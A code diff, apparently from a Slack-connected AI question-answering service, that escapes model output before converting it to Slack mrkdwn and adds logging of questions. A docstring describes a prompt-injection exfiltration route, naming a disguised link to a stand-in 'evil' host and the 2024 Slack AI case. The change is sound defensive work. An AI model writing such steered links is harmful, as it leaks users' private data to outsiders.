@@ -47,6 +47,7 @@ from fastapi import APIRouter, BackgroundTasks, Header, HTTPException, Request, 
 
 from ..agent.routing import _NO_MATCH, choose_agent, choose_scope
 from ..feedback import record_gap
+from ..guard.live import watch_question
 from ..auth.credentials import get_live_connection_token
 from ..auth.users import get_user_by_email
 from ..sources.google_groups import viewer_for_person
@@ -179,7 +180,14 @@ def _to_slack_mrkdwn(text: str) -> str:
     Markdown for the web UI, so converting here is right -- asking the model
     for a per-surface format would make the answer's shape depend on where it
     was asked, and it would forget.
+
+    Escaped FIRST, per Slack's own rule (`&` then `<` then `>`): in mrkdwn
+    `<https://evil?d=…|click here>` is a disguised link and `<!channel>` pings
+    the room, and the model's text is steerable by any document it read — the
+    Slack AI exfiltration (PromptArmor, 2024) was exactly a model-written
+    `<url|text>`. Escaped, both arrive as inert text.
     """
+    text = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
     out: list[str] = []
     for line in text.split("\n"):
         stripped = line.lstrip()
@@ -241,6 +249,7 @@ def _answer(
     COUNT(DISTINCT user_id). Slack has no thumbs yet, so this surface writes
     gaps and never ratings.
     """
+    watch_question(question)  # logged, never refused (guard/live.py)
     # A CHANNEL reply is read by everyone in the room, so it may only ever be
     # built from documents the whole scope can read. Answering a channel as the
     # ASKER would publish their private documents to every other member --
